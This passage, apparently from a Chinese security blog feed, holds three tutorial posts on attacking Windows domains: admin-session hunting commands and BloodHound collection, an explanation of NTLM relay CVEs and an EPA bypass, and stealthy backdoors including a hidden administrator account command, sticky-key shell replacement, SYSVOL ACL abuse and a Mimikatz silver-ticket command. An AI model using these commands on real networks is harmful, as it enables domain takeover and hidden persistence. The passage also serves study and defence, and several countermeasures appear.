href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h4><pre class=" language-cmd"><code class="language-cmd">net group "Domain Admins" /domain</code></pre><h4 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h4><pre class=" language-cmd"><code class="language-cmd">tasklist /v </code></pre><h3 id="查询域控的域用户会话"><a href="#查询域控的域用户会话" class="headerlink" title="查询域控的域用户会话"></a>查询域控的域用户会话</h3><p><a href="https://github.com/nullbind/Other-Projects/tree/master/GDA" target="_blank" rel="noopener">https://github.com/nullbind/Other-Projects/tree/master/GDA</a></p><h3 id="查询远程系统中运行的任务"><a href="#查询远程系统中运行的任务" class="headerlink" title="查询远程系统中运行的任务"></a>查询远程系统中运行的任务</h3><p>首先，从<code>Domain Admins</code>组中收集域管理员列表</p><p>然后，将目标 <code>ip</code> 加到 <code>ips.txt</code> ，将收集的域管理员列表加到 <code>names.txt</code> 文件。</p><pre class=" language-cmd"><code class="language-cmd">FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt && FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause</code></pre><h3 id="扫描远程系统的-NetBIOS-信息"><a href="#扫描远程系统的-NetBIOS-信息" class="headerlink" title="扫描远程系统的 NetBIOS 信息"></a>扫描远程系统的 NetBIOS 信息</h3><p>首先，从<code>Domain Admins</code>组中收集域管理员列表</p><p>然后，将目标 <code>ip</code> 加到 <code>ips.txt</code> ，将收集的域管理员列表加到 admins.txt ` 文件。</p><pre class=" language-cmd"><code class="language-cmd">for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i</code></pre><p>###BloodHound 工具 </p><pre class=" language-bash"><code class="language-bash">brew services start neo4j</code></pre><h4 id="收集脚本"><a href="#收集脚本" class="headerlink" title="收集脚本"></a>收集脚本</h4><p><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors</a></p><pre class=" language-cmd"><code class="language-cmd">SharpHound.exe -c all</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTLM 重放攻击</title>
      <link href="/2020/02/09/ntml-chong-fang-gong-ji/"/>
      <url>/2020/02/09/ntml-chong-fang-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="NTLM-重放攻击"><a href="#NTLM-重放攻击" class="headerlink" title="NTLM 重放攻击"></a>NTLM 重放攻击</h1><h2 id="NTLM-认证流程"><a href="#NTLM-认证流程" class="headerlink" title="NTLM 认证流程"></a>NTLM 认证流程</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207143016.png-water_print" alt=""></p><h2 id="NTLM协议重放攻击-Relay"><a href="#NTLM协议重放攻击-Relay" class="headerlink" title="NTLM协议重放攻击(Relay)"></a>NTLM协议重放攻击(Relay)</h2><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207143306.png-water_print" alt="流程图"></p><h3 id="NTLM重放攻击防御"><a href="#NTLM重放攻击防御" class="headerlink" title="NTLM重放攻击防御"></a>NTLM重放攻击防御</h3><p>目前有许多针对 <code>NTLM</code> 重放攻击的防御措施，主要包括以下几种：</p><ul><li>SMB &amp; LDAP 签名</li><li>EAP (Enhanced Protection Authentication)</li><li>LDAPS Channels</li><li>Server target SPN Validation</li></ul><h4 id="SMB-amp-LDAP-签名"><a href="#SMB-amp-LDAP-签名" class="headerlink" title="SMB &amp; LDAP 签名"></a>SMB &amp; LDAP 签名</h4><p>完成认证后，应用服务器和客户端之间的所有流量都有签名验证保护；用户签名的会话密钥基于客户端的 NTLM 值生成，应用服务器在 <code>NETLOGON</code> 阶段从 <code>DC</code> 服务器获取；客户端采用和 <code>DC</code> 相同的算法，基于自身的 <code>NTLM</code> 值生成会话密钥，因此中间人攻击没有办法获取会话密钥</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207144728.png-water_print" alt=""></p><h4 id="EAP-Enhanced-Protection-Authentication"><a href="#EAP-Enhanced-Protection-Authentication" class="headerlink" title="EAP (Enhanced Protection Authentication)"></a>EAP (Enhanced Protection Authentication)</h4><p><code>NTLM</code> 认证和一个安全通道进行绑定，在 <code>NTLM</code> 认证过程中，最后的 <code>NTLM</code> 认证数据报文包含一个目标应用服务器的证书摘要，这个摘要使用客户端的 <code>NTLM</code> 值进行签名保护，可以防止伪造证书的攻击</p><h2 id="CVE-2015-005"><a href="#CVE-2015-005" class="headerlink" title="CVE-2015-005"></a>CVE-2015-005</h2><p>应用服务器在收到用户客户端的认证信息后，由于本身没有存储用户的口令信息，所以必须依赖域服务器进行认证，将收到的认证信息发送给域服务器，这个过程基于 <code>NETLOGON</code> 协议。该协议在应用服务器和域服务器之间建立一个安全会话，安全会话共享密钥基于应用服务器主机账号的口令 <code>NTLM</code> 生成。</p><h3 id="NETLOGON-步骤"><a href="#NETLOGON-步骤" class="headerlink" title="NETLOGON 步骤"></a>NETLOGON 步骤</h3><p>均为 RPC 远程向认证服务器调用</p><ol><li>NetLogonSamLoginEx</li><li><code>NetLogonSamLogonWithFlags</code></li><li>NetrLogonSamLogon</li><li>NetLogonSamLogoff</li></ol><h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><code>win10x64en$</code> 上的用户 <code>eviluser</code> ，访问内服务器 <code>win2008R2$</code> 的 <code>SMB</code> 服务，采用 <code>NTLM</code> 认证方式，域服务器为 <code>Win2016-dc01$</code> ，认证过程概括如下:</p><ol><li><code>win10x64en$</code> 首先向 <code>win2008R2$</code> 的 SMB445 端口发起一个连接 <code>NTLM_NEGOTIATE</code>，协商使用 <code>NTLM</code> 认证方式；</li><li><code>win2008R2$</code> 收到后，发送 <code>NTLM CHALLEGE</code> 返回给 <code>win10x64en$</code>；</li><li><code>win10x64en$</code> 收到 <code>NTLM CHALLEGE</code> 后，向 <code>win2008R2$</code> 发送一个 <code>NTLM</code> 认证报文；</li><li><code>Win2008R2$</code> 和域控服务器之间共享了 <code>Win2008R2$</code> 的口令 NTLM，以此生成会话密钥，创建一个 <code>NETLOGON</code> 安全会话。<code>Win2008R2$</code> 通过 RPC 调用域服务器的 <code>NetrLogonSamLogonWithFlags</code> 函数，并将 <code>win10x64en$</code> 发送过来的认证信息加上此前的挑战信息全部填装进入作为参数；</li><li>域服务器收到信息后，验证认证信息，如果认证合法则返回 <code>STATUS_SUCCESS</code>；</li><li>如果 <code>NetrLogonSamLogonWithFlags</code> 调用成功，则应用服务器会返回 <code>NETLOGON_VALIDATION</code> 数据结构，该结构的结尾可能是以下结构中的一种: <code>NETLOGON_VALIDATIN_SA_FO</code> ，<code>NETLOGON_VALIDATION_SAM_INFO2</code>，<code>NETLOGON_VALIDATION_SAM_INFO4</code>。在这个结构中有一个重要的数据，就是 <code>SessionKey</code> ，用于用户客户端和应用服务器之间的签名、加密等；</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207151317.png-water_print" alt=""></p><ol start="7"><li><code>SessionKey</code> 基于客户端用户的口令 <code>NTLM</code> 生成，应用服务器从 <code>DC</code> 获取，客户端用户自己采用相同的算法生成，因此应用服务器和客户端不需要交互 <code>SessionKey</code>;</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207151646.png-water_print" alt="NetrLogonSamLogonWithFlags 函数参数定义"></p><ol start="8"><li>第二个参数为主机名(微软的解释“Computer Name: The Unicode string that contains the NetBIOS name of the client computer calling this method”)，主机名为调用该函数的客户端主机名，也就是应用服务器通过 RPC 远程调用的该函数，因此该主机名理论上应该与做应用服务器域服务器之间安全会话密钥的主机账号应该一致。</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200207152025.png-water_print" alt=""></p><p>所以任何一台域内主机，只要能拿到此前用户和应用服务器的认证信息，就可以向域服务器发起 <code>NETLOGON</code>，从而获取 <code>SessionKey</code>，这样后面可以伪造应用服务器和客户端用户之间的数据签名，满足中间人攻击。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>影响 Windows Server 2012 及以下，对个人 PC 无影响</p><p>微软发布了补丁 <code>MS15-027</code>，针对这个漏洞进行了修补，对 <code>ComputerName</code> 和 <code>NetBIOS</code> 这 2 个字段进行了校验，并且对这个消息认证快进行了签名校验</p><h2 id="CVE-2019-1019"><a href="#CVE-2019-1019" class="headerlink" title="CVE-2019-1019"></a>CVE-2019-1019</h2><p>在 CVE-2015-005 漏洞被修补后，域服务器会校验 ComputerName 和 NetBIOS 这 2 个字段是否一致。但是如果 ComputerName 字段缺失，则域服务器会接受，而且不会对认证消息进行完整性校验(MIC) 。</p><p>由于 <code>NTLM_AUTHENTICATION</code> 报文中的很多信息，包括 <code>ComputerName</code> 字段信息，是从 <code>NTLM-CHALLENGE</code> 中拷贝获取，因此在攻击者可以截获由应用服务器发送给客户端的挑战信息，并将 <code>ComputerName</code> 字段进行删除，客户端收到挑战信息后，由于找不到 <code>ComputerName</code> 字段，会导致随后的 <code>NTLM_AUTHENTICATION</code> 也不包含该字段</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200208103534.png-water_print" alt=""></p><p>通过配置，可以让 NTLM 启用完整性校验，即在认证消息中添加一个字段 <code>MIC(Message Integrity Code)</code>，在新版本中这是默认开启的功能。<code>MIC</code> 是用来保护 NTLM 认证报文的完整性，即 <code>NTLMCHALLENGE</code>。</p><p><code>MIC</code> 通过基于 <code>SessionKey</code> 会话秘钥的 <code>HMAC_MD5</code> 算法实现完整性保护，而此前的分析中，我们有能力方法获取这个 <code>SessionKey</code>，因此修改后重新计算 <code>MIC</code> 即可。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200208103900.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200208104134.png-water_print" alt=""></p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol><li><p>客户端发起到应用服务器的 <code>NTLM_NEGOTIATE</code>，被重放攻击者捕获</p></li><li><p>攻击者将 <code>NTLM_NEGOTIATE</code> 转发给真正的应用服务器，也即我们的攻击目标</p></li><li><p>应用服务器返回一个 <code>NTLM_CHALLENGE</code> 给攻击者</p></li><li><p>重放攻击者将 <code>NTLM_CHALLENGE中</code> 的 <code>ComputerName</code> 字段去掉，然后转发给客户端</p></li><li><p>客户端收到修改后的 <code>NTLM_CHALLENGE</code> ，基于这些信息构造 <code>NTLM_AUTHENTICATE</code> ，将认证信息发送给重放攻击者，此时认证消息已经包含 <code>MIC</code> </p></li><li><p>重放攻击者向域服务器发起一个 <code>NETLOGON</code> 会话请求，由于认证消息中 <code>ComputerName</code> 字段缺失，域服务器不进行完整性校验，认可该认证消息，并返回一个 <code>Sessionkey</code> </p></li><li><p>重放攻击者重新计算 <code>MIC</code> ，并将新的 <code>NTLM_AUTHENTICATE</code> 发送给应用服务器</p></li><li><p>应用服务器收到 <code>NTLM_AUTHENTICATE</code> 后，校验 <code>MIC</code>，然后向域服务器发起 <code>NETLOGON</code> 会话请求，域服务器返回认证成功的响应，其中包含会话密钥，这个会话密钥和第 6 步中的会话密钥相同</p></li><li><p>重放攻击者成功地与应用服务器建立了一个带签名的会话，获取了客户端用户在应用服务器上的访问权限，如果客户端用户是管理员，而应用服务器是域服务器，则重放攻击者具备了在域服务器(应用服务器)上的管理员权限(客户端)。</p></li></ol><h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h2><p>在安装了 <code>CVE-2015-005</code> 的补丁后，系统会校验 <code>NetBIOS</code> 的名称和 <code>NetrLogonSamLogonWithFlags</code> 函数的 <code>ComputeName</code> 参数是否相同。因此，此前通过修改 <code>ComputerName</code> 来获取 <code>SessionKey</code> 的方法失效。</p><p>但是如果认证信息中的 <code>NetBIOS</code> 被删除或者消失后，认证服务器不会再进行前面的名字校验，也就是说我们再修改 <code>ComputerName</code> 参数，能达成 <code>CVE-2015-0005</code> 漏洞的效果，从而获取会话密钥。</p><p>针对这种情况，可以通过配置“服务器拒绝任何没有NetBIOS的请求”来阻止此类攻击。但是在  <code>NTLMv1</code> 中，NTLM 消息块结构体中，本来就没有这个字段，因此这种攻击在 <code>NTLMv1</code> 场景中难以通过策略或者补丁来杜绝，仍然存在很大的脆弱性。</p><p>客户端和服务器在 NTLM 协商时，通过下图中 <code>NegotiatFlags</code> (即 msvAvFlags 字段)来标识是否需要 MIC 来保护会话的完整性，见下图中红色框标识。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200208114101.png-water_print" alt=""></p><p>SMB 客户端在 NTLM 认证时，默认设置需要 MIC 进行完整性校验保护。直观而言，一般会有几种方式对抗 MIC，一是修改 MIC，前提条件是获取会话密钥，在前面我们看到如果配置了防护策略，通过删除 NetBIOS 不能获取会话密钥；二是直接丢弃 MIC，这时需要将 <code>msVAvFlags</code> 字段中的标志位同样进行修改，以及版本信息，因为有些版本默认是必须要有 MIC。</p><p>msVAvFlags 字段的定义，查看微软知识库，如果为 <code>0x00000002</code> 表示客户端通过 <code>MIC</code> 来保护数据报文的完整性</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200208114702.png-water_print" alt=""></p><p><code>msvAVFlags</code> 字段由用户的 NTLM 散列值进行签名保护，因此不能修改 <code>msvAVFlag</code> 字段。实际中非常神奇，域服务器并不真正在乎 MIC 和 Version 信息是否存在，如果存在，则校验，如果不存在则不校验。</p><p>上述的攻击方式，可以通过配置进行阻止，即如果 <code>msvAVFlags</code> 字段表明有 MIC 完整性校验，就必须要有 MIC 的存在，而且进行校验。但是在实际应用场景中，仍然存在一些隐患，例如 <code>MacOS</code> 、<code>Linux</code> 系统中的 <code>FireFox</code> 默认情况下，不添加 MIC。</p><h2 id="EPA-Bypass"><a href="#EPA-Bypass" class="headerlink" title="EPA-Bypass"></a>EPA-Bypass</h2><p>EPA (Enhanced Protection for Authentication)，将认证报文绑定到一个安全通道中，主要用于保护 Windows 集成认证的服务，例如OWA、ADFS、 LDAPS。</p><p>具体的做法是，在认证报文中添加一个字段 <code>Channel Bindings</code>，根据微软的说明，<code>Channel Bindings</code> 为一段 <code>MD5 Hash</code> 值，表示结构体 <code>gss_channel_bindings_struct</code> 的 <code>MD5Hash</code> 值。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200209104650.png-water_print" alt=""></p><p>如果启用了 <code>EPA</code>，在客户端发送的认证报文中，会添加一个字段 <code>NTProofStr</code>，这是一段签名，用来保护 <code>Channel Bindings</code>。微软给出 <code>NTProofStr</code> 的计算算法如下:</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200209105337.png-water_print" alt=""></p><p>可以得知， <code>NTProofStr</code> 基于用户的 <code>NTLM</code> 值计算得来，因此，在此种攻击场景中不可能计算得出。可以使用 EPA 来保护 <code>ADFS</code>、<code>OWA</code>、 <code>LDAPS</code> 等基于 <code>NTLM</code> 认证的场景。比较悲剧的是，默认情况下，上述这些服务器都取消了 <code>EPA</code>。<code>NTProofStr</code> 和 <code>Channel Bindings</code> 在实际的报文中见下图，这是一个客户端发送的认证报文。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200209110550.png-water_print" alt=""></p><p>如果我们在服务器发送挑战信息到客户端时，在挑战报文主动中添加一个 <code>Channel Bindings</code> 到消息块中，类似于下图所示，注意下图是服务器发送的挑战报文，由于 <code>Channel Bindings</code> 是一段 <code>MD5Hash</code> 值，是比较好添加的。</p><p>客户端收到挑战信息后，会将我们事先添加的 <code>Channel Bindings</code> ，并且再次计算一个新的 <code>Channel Bindings</code> 添加到认证报文后面，导致认证报文包含 2 个 <code>Channel Bindings</code>，见下图，注意这是一个客户端发送的认证报文。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200209111242.png-water_print" alt=""></p><p>在这种情况下，域服务器会选择第一个 <code>ChannelBindings</code> 进行校验，忽略第二个 <code>Channel Bindings</code>，这样我们就可以规避 <code>EPA</code> 的保护，实现攻击目的。</p><p>如果客户端开启了<code>MIC</code>保护，则和前面一样，直接丢弃 <code>MIC</code></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://i.blackhat.com/USA-19/Wednesday/us-19-Simakov-Finding-A-Needle-In-An-Encrypted-Haystack-Leveraging-Cryptographic-Abilities-To-Detect-The-Most-Prevalent-Attacks-On-Active-Directory.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Wednesday/us-19-Simakov-Finding-A-Needle-In-An-Encrypted-Haystack-Leveraging-Cryptographic-Abilities-To-Detect-The-Most-Prevalent-Attacks-On-Active-Directory.pdf</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐蔽域后门</title>
      <link href="/2020/02/07/yin-bi-yu-hou-men/"/>
      <url>/2020/02/07/yin-bi-yu-hou-men/</url>
      
        <content type="html"><![CDATA[<h1 id="隐蔽域后门"><a href="#隐蔽域后门" class="headerlink" title="隐蔽域后门"></a>隐蔽域后门</h1><ul><li>隐藏用户</li><li>隐蔽程序</li><li>粘滞键</li></ul><h2 id="常见后门方式"><a href="#常见后门方式" class="headerlink" title="常见后门方式"></a>常见后门方式</h2><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre class=" language-cmd"><code class="language-cmd">net user yincang$ 123456qaq /addnet localgroup administrators yincang$ /add</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205185519.png-water_print" alt="net user 隐藏用户无显示"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205185349.png-water_print" alt=""></p><h3 id="隐蔽程序"><a href="#隐蔽程序" class="headerlink" title="隐蔽程序"></a>隐蔽程序</h3><p>####### NtGodMode</p><p><code>NtGodMode.exe</code> 上帝之门，不管管理员如何更改口令密码，均能以任意口令登录系统</p><p><a href="https://blog.csdn.net/oceanark/article/details/51902042" target="_blank" rel="noopener">https://blog.csdn.net/oceanark/article/details/51902042</a></p><p><a href="https://www.jb51.net/article/14702.htm" target="_blank" rel="noopener">https://www.jb51.net/article/14702.htm</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=19817&amp;page=1" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=19817&amp;page=1</a></p><h4 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h4><p>命名管道，<code>\Server\PipeName\Path</code></p><p>IP + Port 是常用的远程连接方式命名管道不需要特定的端口，混杂在135端口中。</p><p>实现不开端口的情况下登录</p><h3 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h3><p>五次连续按下 <code>shift</code> 键，会弹出输入法选择器。可以将 <code>cmd</code> 替换输入法，获取 <code>Shell</code></p><h2 id="域内隐蔽后门"><a href="#域内隐蔽后门" class="headerlink" title="域内隐蔽后门"></a>域内隐蔽后门</h2><h3 id="目录-ACL"><a href="#目录-ACL" class="headerlink" title="目录 ACL"></a>目录 ACL</h3><p>一种基于域内对象 <code>ACL(Access Control Link</code>)访问控制链的深度隐藏后门。</p><p>域网络中，域的组策略和脚本存放在域服务器的 <code>SYSVOL</code> 目录，所有域用户均可自由访问，但只有部分高权限用户才有修改权限。域内账号在登录域时，会查询、 执行(如果有变化)属于自己的域策略、执行脚本。</p><p>一定程度上说，控制了 <code>SYSVOL</code> 目录，就有很大概率控制域网络。</p><p>如果域中部署了登录日志审计软件，则会严格审计域内高权限账号的登录、使用情况。所以使用高权限用户控制域网络的方式，隐蔽性并不高</p><p>一般来说，域策略会强制周期性修改高权限用户的密码，但是对低权限用户来说不一定有这个强制性要求，而且域中往往有很多用户几乎不怎么登录、使用。</p><p>如果低权限用户具备 <code>SYSVOL</code> 目录的修改权限，登录域时，因为权限不高，不会被审计软件发现。现在的防护、监控类软件还没有过多关注目录的ACL，因此这种方式是一种很实用的隐蔽后门方式。</p><p>使用普通用户 <code>eviluser</code> 登录域客户端 <code>Windows 7</code>。通过net use连接域服务器，可查看访问服务器共享的目录，但是没有写权限。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205191517.png-water_print" alt=""></p><p>通过资源管理工具给 <code>Policies</code> 目录添加了写权限(也可以是完全控制权)，并继承给所有子目录和文件</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205191619.png-water_print" alt=""></p><p><code>Policies</code> 目录的安全选项卡，<code>eviluser</code> 单独作为权限用户。正常情况下，普通用户都只有 <code>Authenticated users</code> 用户组权限。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205191815.png-water_print" alt=""></p><p>服务器中目录的 <code>ACL</code> 权限设置成功后，在原来的 <code>IPC</code> 连接中，普通域用户 <code>eviluser</code> 成功地往 <code>Policies</code> 目录写入 了数据，证明具备了对该目录的写入权限。从而可以修改里面的策略和脚本，一种隐蔽的后门。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200205192019.png-water_print" alt=""></p><p>这种后门方式，只是演示了 <code>ACL</code> 后门的一种具体形式，因为域中的对象太多，可以操控的 <code>ACL</code>对象也很多。可以根据自己的需要，灵活选择目标的ACL作为目标进行修改，埋藏后门。</p><p>当然关于 <code>ACL</code> 的检测，微软也推出了专门的工具，<code>ACL Scanner</code> ，如果周期性地是用该工具进行检测，还是能检测到这种类型的后门。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>在 <code>windows</code> 系统中，许多服务以主机账号运行，即许多 <code>ServiceAccount</code> 账号为本机的主机账号，格式为 <code>ComputerName$</code>。</p><p>下表是常见的以主机账号运行的服务。右边一栏中有些有多个服务，例如 <code>WMI</code> 服务包括 <code>HOST</code>、<code>RPCSS</code> 这 2 个服务，表示访问 <code>WMI</code> 服务同时需要 2 个 <code>TGS</code> 票据</p><table><thead><tr><th align="center">服务名称</th><th align="center">同时需要的服务</th></tr></thead><tbody><tr><td align="center">WMI</td><td align="center">HOST、RPCSS</td></tr><tr><td align="center">PowerShell Remoting</td><td align="center">HOST、HTTP</td></tr><tr><td align="center">WinRM</td><td align="center">HOST、HTTP</td></tr><tr><td align="center">Scheduled Tasks</td><td align="center">HOST</td></tr><tr><td align="center">Windows File Share</td><td align="center">CIFS</td></tr><tr><td align="center">LDAP</td><td align="center">LDAP</td></tr><tr><td align="center">Windows Remote Server</td><td align="center">RPCSS、LDAP、CIFS</td></tr></tbody></table><p>已知域服务器主机账号的口令散列值，使用 <code>Mimikatz</code> 的白银票据功能，伪造访问 <code>HOST</code> 服务的<code>TGS</code> ，以域管理员权限运行域服务器的 <code>SCHTASKS</code> 命令，远程创建、查看、删除系统任务</p><h4 id="构造白银票据"><a href="#构造白银票据" class="headerlink" title="构造白银票据"></a>构造白银票据</h4><pre class=" language-cmd"><code class="language-cmd">kerberos::golden /admin:administrator@testlab.com /domain:testlab.com /sid:S-1-5-21-2390976136-1701108887-179272945 /target:TESTLABDC02.testlab.com /rc4:36788836f262b9409f102baa22b7a6f3 /service:host /ptt</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206110609.png-water_print" alt="构造HOST白银票据"></p><h4 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h4><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206110832.png-water_print" alt=""></p><h4 id="修改主机账号的口令策略制作后门"><a href="#修改主机账号的口令策略制作后门" class="headerlink" title="修改主机账号的口令策略制作后门"></a>修改主机账号的口令策略制作后门</h4><ol><li>在主机的注册表中修改策略，具体位置为<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon\Parameters</code>，键值为 <code>DisablePasswordChange</code>，设置为 1，即表示禁止修改账号口令;</li><li>在组策略中修改默认的 30 天，修改位置为 “<code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Maximum machine account password age</code>“，设置为 0 时，表示无限长;</li></ol><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206112843.png-water_print" alt=""></p><ol start="3"><li>组策略直接禁止修改主机账号口令，用来支持 <code>VDI(virtual desktops Infrastructure)</code> 等类型的使用，具体位置为 “<code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Disable machine account password changes</code>“</li></ol><p>方案 1 较为安全。由于组策略存在快照，因此方案 2、3 风险较大</p><h4 id="修改主机账号的委派设置权限制作后门"><a href="#修改主机账号的委派设置权限制作后门" class="headerlink" title="修改主机账号的委派设置权限制作后门"></a>修改主机账号的委派设置权限制作后门</h4><p>域委派攻击中，一个主机账号被设置了约束性委派，则可以使用主机账号的口令散列值和约束性委派获取域管理员权限。前提条件为：主机账号的口令散列值和委派(约束性和非约束性均可)</p><p>如果我们在域内有多个稳定的控制点，且获取了当前系统的 <code>SYSTEM</code> 权限，则随时可获取当前主机的主机账号 (演示中的账号为 <code>win7x86cn$</code> )口令散列值，满足了第 1 个条件;</p><p>如果将该 <code>win7x86cn$</code>账号的 <code>SeEnableDelegationPrivilege</code> 权限赋予本机的低权限登录域用户 (eviluser) ，则通过 <code>eviluser</code> 用户随时可更改 <code>win7x86cn$</code> 账号的委派设置，从而可满足第 2 个条件</p><p>并不是拥有一个对象的 <code>GenericAll</code> 权限，就可以修改对象的 <code>msDS-AllowedToDelegateTo</code> 属性，攻击者只有拥有对象的 <code>SeEnableDelegationPrivilege</code> 权限时，才能修改</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206140534.png-water_print" alt=""></p><p>默认情况下，<code>SeEnableDelegationPrivilege</code> 权限只有域控制器才有，因此我们需要检测应用到这些域控制器上的哪些组策略改变了用户的 <code>SeEnableDelegationPrivilege</code> 权限配置</p><p>一般情况下，都是默认组策略“Default Domain Controllers Policy”</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206140922.png-water_print" alt=""></p><p><code>SeEnableDelegationPrivilege</code> 权限很特殊，设置方法为修改 <code>GPO</code> 策略文件，位置为域服务器中<code>\SYSVOL\sysvol\testlab.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>文件</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141126.png-water_print" alt=""></p><p>添加 <code>eviluser</code> 具备 <code>SeEnableDelegationPrivilege</code> 权限，则 <code>eviluser</code> 可修改域内所有用户的委派设置。下图是测试在 <code>eviluser</code> 的登录会话中修改 <code>win7x86cn$</code> 账号的委派设置</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141250.png-water_print" alt=""></p><p>查看了 <code>win7x86cn</code> 这个账号的委派设置情况，标红的 <code>useraccountcontrol</code> 表示没有设置委派，中间使用 <code>Set-DomainObject</code> 进行委派设置，16777216 表示设置 <code>TRUS TED_TO_AUTH_FOR_DELEGATION</code>，通过<code>Get-DomainObject</code> 查询设置后的结果，有了 <code>msds-allowedtodelego</code> 选项，且 <code>useraccountcontrol</code> 发生了变更。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141704.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141751.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141818.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200206141841.png-water_print" alt=""></p><h4 id="应对此后门的安全策略"><a href="#应对此后门的安全策略" class="headerlink" title="应对此后门的安全策略"></a>应对此后门的安全策略</h4><ol><li><p>通过域的组策略强制设置主机账号的最长有效期为 30 天;</p></li><li><p>保护 <code>{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows 